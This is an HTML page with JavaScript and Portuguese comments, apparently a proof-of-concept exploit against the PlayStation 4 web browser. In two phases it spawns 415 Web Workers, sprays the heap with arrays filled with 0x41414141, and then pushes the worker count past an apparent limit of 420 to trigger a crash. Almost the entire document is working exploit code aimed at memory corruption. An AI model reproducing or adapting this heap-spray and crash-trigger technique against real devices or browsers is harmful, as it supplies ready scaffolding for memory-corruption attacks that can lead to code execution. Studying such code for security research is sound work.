<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Limit Sniper (Target: 420)</title>
<style>
    body { background: #000; color: #fff; font-family: monospace; padding: 20px; }
    button { padding: 15px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
    .btn-prep { background: #2980b9; border: 1px solid #fff; color: #fff; }
    .btn-fire { background: #c0392b; border: 1px solid #f00; color: #fff; }
    #log { border: 1px solid #444; height: 300px; overflow-y: scroll; padding: 10px; color: #0f0; }
</style>
</head>
<body>

<h1>TARGET LIMIT: 420</h1>
<p>Estratégia: Encher até 415 -> Spray de Memória -> Trigger no 420</p>

<button class="btn-prep" onclick="phase1_FillSafe()">FASE 1: Encher até 415 (Seguro)</button>
<button class="btn-fire" onclick="phase2_Trigger()">FASE 2: Spray + Crash (Trigger)</button>

<div id="log">Sistema pronto.</div>

<script>
    let workers = [];
    // Payload do worker: mantém-se vivo
    const blobUrl = URL.createObjectURL(new Blob([`onmessage=()=>{}`], {type: 'application/javascript'}));

    function log(msg) {
        const l = document.getElementById('log');
        l.innerText += "\n> " + msg;
        l.scrollTop = l.scrollHeight;
    }

    // FASE 1: Chegar perto do limite sem cair
    function phase1_FillSafe() {
        log("A criar 415 workers...");
        let count = 0;
        const i = setInterval(() => {
            if(count >= 415) {
                clearInterval(i);
                log("FASE 1 CONCLUÍDA: 415 Threads ativas.");
                log("Aguarde 5 segundos para estabilização antes da FASE 2.");
                return;
            }
            try {
                workers.push(new Worker(blobUrl));
                count++;
                if(count % 50 === 0) log(`Progresso: ${count}...`);
            } catch(e) {
                log("Erro inesperado na fase segura: " + e.message);
                clearInterval(i);
            }
        }, 5); // Criação rápida mas controlada
    }

    // Função de Spray (Encher memória com AAAA)
    function heapSpray() {
        log("A injetar padrão 0x41414141 na Heap...");
        const spray = [];
        try {
            for(let i=0; i < 500; i++) {
                // Cria Arrays Uint32 preenchidos com 0x41414141
                let buffer = new Uint32Array(1024 * 8); // 32KB
                buffer.fill(0x41414141);
                spray.push(buffer);
            }
        } catch(e) {}
        return spray;
    }

    // FASE 2: O Passo Final
    function phase2_Trigger() {
        // 1. Sujar a memória
        const junk = heapSpray(); 
        
        log("Memória preparada. A iniciar rutura de limite...");
        
        // 2. Tentar passar de 415 para 430 (Vai bater no 420 e crashar)
        let count = 415;
        const i = setInterval(() => {
            try {
                workers.push(new Worker(blobUrl));
                count++;
                log(`WORKER Nº ${count} CRIADO`);
                
                // Reforçar o spray a cada passo
                if(count >= 418) heapSpray();

            } catch(e) {
                log(`ERRO CAPTURADO NO ${count}: ${e.message}`);
                log("Se o console não desligou, o bug foi mitigado.");
            }
        }, 100); // Lento para garantir que o spray está lá quando o crash ocorrer
    }
</script>

</body>
</html>
